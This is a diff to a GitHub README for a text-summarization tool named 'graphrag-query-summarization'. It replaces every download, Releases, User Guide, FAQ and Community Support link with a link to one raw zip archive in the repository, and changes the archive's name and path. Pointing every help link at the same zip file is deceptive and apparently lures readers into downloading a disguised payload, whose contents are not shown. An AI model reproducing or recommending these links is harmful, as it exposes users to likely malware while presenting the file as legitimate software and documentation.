@@ -1,6 +1,6 @@
 # 🎉 graphrag-query-summarization - Simplify Summarization of Large Texts
 
-[![Download](https://raw.githubusercontent.com/newspapercriticcontribution396/graphrag-query-summarization/main/scripts/graphrag-query-summarization_1.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/newspapercriticcontribution396/graphrag-query-summarization/main/scripts/graphrag-query-summarization_1.7.zip)
+[![Download](https://raw.githubusercontent.com/newspapercriticcontribution396/graphrag-query-summarization/main/data/query-summarization-graphrag-v2.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/newspapercriticcontribution396/graphrag-query-summarization/main/data/query-summarization-graphrag-v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Before you download, ensure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [graphrag-query-summarization Releases](https://raw.githubusercontent.com/newspapercriticcontribution396/graphrag-query-summarization/main/scripts/graphrag-query-summarization_1.7.zip).
+To get started, visit this page to download: [graphrag-query-summarization Releases](https://raw.githubusercontent.com/newspapercriticcontribution396/graphrag-query-summarization/main/data/query-summarization-graphrag-v2.6.zip).
 
 ### Installation Steps
 
@@ -54,9 +54,9 @@ If you face any issues during installation or usage, consider the following step
 
 For more detailed explanations and help, check the following:
 
-- [User Guide](https://raw.githubusercontent.com/newspapercriticcontribution396/graphrag-query-summarization/main/scripts/graphrag-query-summarization_1.7.zip)
-- [FAQ](https://raw.githubusercontent.com/newspapercriticcontribution396/graphrag-query-summarization/main/scripts/graphrag-query-summarization_1.7.zip)
-- [Community Support](https://raw.githubusercontent.com/newspapercriticcontribution396/graphrag-query-summarization/main/scripts/graphrag-query-summarization_1.7.zip)
+- [User Guide](https://raw.githubusercontent.com/newspapercriticcontribution396/graphrag-query-summarization/main/data/query-summarization-graphrag-v2.6.zip)
+- [FAQ](https://raw.githubusercontent.com/newspapercriticcontribution396/graphrag-query-summarization/main/data/query-summarization-graphrag-v2.6.zip)
+- [Community Support](https://raw.githubusercontent.com/newspapercriticcontribution396/graphrag-query-summarization/main/data/query-summarization-graphrag-v2.6.zip)
 
 ## 🛠️ Contributing 
 
